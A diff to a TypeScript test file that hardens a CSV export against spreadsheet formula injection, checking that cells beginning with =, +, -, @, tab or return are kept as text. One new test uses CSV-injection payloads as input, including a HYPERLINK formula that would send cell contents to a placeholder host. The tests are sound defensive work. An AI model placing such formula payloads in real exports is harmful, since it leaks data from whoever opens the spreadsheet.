@@ -4,7 +4,7 @@
  *  examples in the other tests (#203). They need no browser, so they run in one project only. */
 import { expect, test } from "@playwright/test";
 import fc from "fast-check";
-import { csv } from "../src/csv";
+import { csv, FORMULA } from "../src/csv";
 import { decimalInput, parseDecimal, parseWatts } from "../src/decimal";
 import { nextDay, zonedTime } from "../src/zoned";
 
@@ -44,16 +44,22 @@ function parseCsv(text: string, separator: string): string[][] {
 }
 
 test("the CSV export reads back exactly, whatever the cells contain", () => {
-  const cells = fc.oneof(fc.string({ unit: "binary" }), fc.constantFrom('"', ";", ",", "\r\n", "\n", '""', "ä€😀"));
+  const cells = fc.oneof(fc.string({ unit: "binary" }), fc.constantFrom('"', ";", ",", "\r\n", "\n", '""', "ä€😀", "=1+1", "-2", "@x"));
   fc.assert(fc.property(
     fc.array(fc.array(cells, { minLength: 1, maxLength: 7 }), { minLength: 1, maxLength: 20 }),
     fc.constantFrom(";", ","),
     (rows, separator) => {
       const text = csv(rows, separator);
       expect(text.startsWith("﻿")).toBe(true); // BOM, so spreadsheets read the umlauts as UTF-8
-      expect(parseCsv(text.slice(1), separator)).toEqual(rows);
+      // a cell that would be a formula is kept as text with a leading ' (GHSA-9qfr-fvc7-hm9g)
+      expect(parseCsv(text.slice(1), separator)).toEqual(rows.map((row) => row.map((v) => (FORMULA.test(v) ? `'${v}` : v))));
     },
   ));
+});
+
+test("no cell of the CSV export starts like a formula", () => {
+  const text = csv([['=HYPERLINK("http://example.org/"&A1)', "+1", "-1", "@SUM(A1)", "\tx", "\rx", "ok"]], ";");
+  for (const cell of parseCsv(text.slice(1), ";")[0]) expect(FORMULA.test(cell)).toBe(false);
 });
 
 test("a number shown in an input field is read back as the same number", () => {
